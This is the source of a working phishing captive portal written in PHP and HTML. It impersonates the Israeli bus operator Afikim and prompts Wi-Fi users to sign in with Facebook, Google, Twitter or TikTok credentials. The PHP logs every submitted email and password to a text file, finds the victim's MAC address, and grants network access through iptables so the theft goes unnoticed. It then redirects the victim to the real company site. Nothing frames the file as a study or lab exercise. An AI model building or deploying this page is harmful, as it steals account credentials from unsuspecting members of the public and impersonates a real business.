<?php
$socialn = $_POST['socialn']; // Get post socialln
	if(!empty($socialn)) { // Check if socialln not empty
		$email = $_POST['email']; // Get email from post
		$userpassword = $_POST['userpassword']; // Get password from post
		file_put_contents('passwords.txt', print_r($_POST, true), FILE_APPEND); // write all post data to password.txt
		sleep(2); // Wait 2 sec
		$ip = $_SERVER['REMOTE_ADDR']; // Get user local ip
		$mac = shell_exec("sudo /usr/sbin/arp -an " . $ip); // Run shell command and search user with local ip in arp
		preg_match('/..:..:..:..:..:../',$mac , $matches); // Serching...
		$mac = @$matches[0]; // Get first found
		$res = shell_exec("sudo /sbin/iptables -I captiveportal 1 -t mangle -m mac --mac-source $mac -j RETURN 2>&1"); // Add user to trusted
		exit; // Stop code her! and show blank page...
	}
		else // esle back header status 302 and show html page
	{
		header("HTTP/1.1 302 Found");
		header("Status: 302 Found");
	}
?>

<!doctype html>
<html lang="he-IL">
<head>
	<meta charset="UTF-8">
	<title>אפיקים תחבורה ציבורית - Afikim</title>
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<meta name="description" content="אפיקים תחבורה ציבורית - Afikim">
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
	<link rel="stylesheet" href="style.css" type="text/css">
</head>

<body>
	<div class="inner-container">
		<p><a href="javascript://" class="logo"><img src="/images/logo.png"></a></p>
		<div class="hide-container">
			<ul id="icons">
			<li><a href="javascript://" title="facebook" class="tooltip"><img src="/social/fb.png" alt="" class="icon"></a></li>
			<li><a href="javascript://" title="twitter" class="tooltip"><img src="/social/tw.png" alt="" class="icon"></a></li>
			<li><a href="javascript://" title="google" class="tooltip"><img src="/social/go.png" alt="" class="icon"></a></li>
			<li><a href="javascript://" title="tiktok" class="tooltip"><img src="/social/tt.png" alt="" class="icon"></a></li>
			</ul>	
			<div class="box">
				<h1>התחברות</h1>
				<form id="formSend" name="theform" action="javascript://" method="post" onsubmit="return validateForm();">
					<select name="socialn" class="list">
					<option value="facebook">Facebook</option>
					<option value="twitter">Twitter</option>
					<option value="google" selected>Google</option>
					<option value="tiktok">TikTok</option>
					</select>
					<input type="email" name="email" class="input" required placeholder="כתובת מייל"/>
					<input type="password" name="userpassword" class="input" required placeholder="סיסמה"/>
					<input type="submit" value="כניסה" class="button">
				</form>
				<p><small>.אין צורך בהרשמה. התחבר באמצעות החשבון החברתי שלך</small></p>
			</div>
		</div>
		<div class="show-container"><div class="box"><p>!תודה ,שיהיה גלישה נעימה</p></div></div>
	</div>
	<script type="text/javascript" src="/jquery.min.js"></script>
	<script type="text/javascript">
	var show = $('.show-container');
	var hide = $('.hide-container');
		// Send post
		$('#formSend').submit(function(){
			$.post('/index.php', $(this).serialize()).done(function(){
				hide.fadeOut('slow', function(){show.fadeIn('slow', function(){setTimeout(function(){window.location.replace('https://afikim-t.co.il/')}, 3000)})});
			})
			.fail(function() {
				alert('An unknown error occurred!');
			});	
		});
		// Select on icon click
		$('.tooltip').click(function(){
			var select = $(this).attr('title');
			$('div.box select').val(select).change();
		});	
	</script>
	<div class="social-icons"></div>
</body>
</html>
